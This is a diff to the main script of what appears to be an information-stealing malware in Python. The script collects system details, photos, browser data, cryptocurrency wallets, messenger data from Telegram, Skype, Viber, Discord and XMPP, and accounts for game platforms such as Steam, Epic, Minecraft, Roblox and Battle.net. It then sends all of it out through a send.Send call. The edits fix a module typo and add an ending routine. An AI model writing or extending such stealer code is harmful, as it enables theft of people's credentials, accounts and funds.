@@ -36,7 +36,7 @@ from scripts.manager import make_folder
 from scripts.system import system_info
 from scripts.system import programs
 from scripts.system import photos
-from scripts.games import Minacraft
+from scripts.games import Minecraft
 from scripts.messengers import telegram
 from scripts.manager import send 
 from scripts.manager import clear
@@ -49,6 +49,7 @@ from scripts.wallets import wallets
 from scripts.messengers import skype
 from scripts.games import BattleNET
 from scripts.games import Uplay
+from scripts.manager import ending
 from scripts.messengers import viber
 from scripts.browsers.browsers import Browsers
 from scripts.files import Files_txt
@@ -63,7 +64,7 @@ Browsers()
 dataForMassageBrowsers = Browsers.Return()
 dataForMassageOther = epicGames.Epic(dataForMassageOther)
 dataForMassageOther = Uplay.Ubisoft(dataForMassageOther)
-dataForMassageOther = Minacraft.Minecraft(dataForMassageOther)
+dataForMassageOther = Minecraft.Minecraft(dataForMassageOther)
 dataForMassageOther = roblox.roblox(dataForMassageOther)
 dataForMassageOther = steam.Steam(dataForMassageOther)
 dataForMassageOther =BattleNET.BattleNet(dataForMassageOther)
@@ -89,6 +90,6 @@ except Exception as e:
     print(e)
 try:
     send.Send(sendType,np,dataForMassageSYS,dataForMassageBrowsers,dataForMassageOther,dataForMassageWallets,dataForMassageFiles,discordData,TelegramData,xmppData)
-    pass
 except Exception as e:
     print(e)
+ending.End()
